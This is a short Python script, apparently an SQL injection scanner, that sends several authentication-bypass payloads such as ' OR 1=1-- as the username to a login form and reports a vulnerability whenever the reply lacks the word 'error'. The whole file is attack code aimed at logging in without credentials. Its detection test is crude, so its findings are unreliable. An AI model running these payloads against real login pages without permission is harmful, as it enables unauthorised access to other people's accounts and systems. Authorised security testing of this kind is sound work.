import requests

def sql_injection_scanner(url):
    payloads = ["' OR 1=1--", "' OR '1'='1", "' OR ''='", "' OR 1=1#", "' OR '1'='1#", "' OR ''='#"]
    
    for payload in payloads:
        data = {"username": payload, "password": "password"}
        response = requests.post(url, data=data)
        if "error" not in response.text.lower():
            print(f"SQL Injection vulnerability found with payload: {payload}")

# Example usage
url = "https://example.com/login"
sql_injection_scanner(url)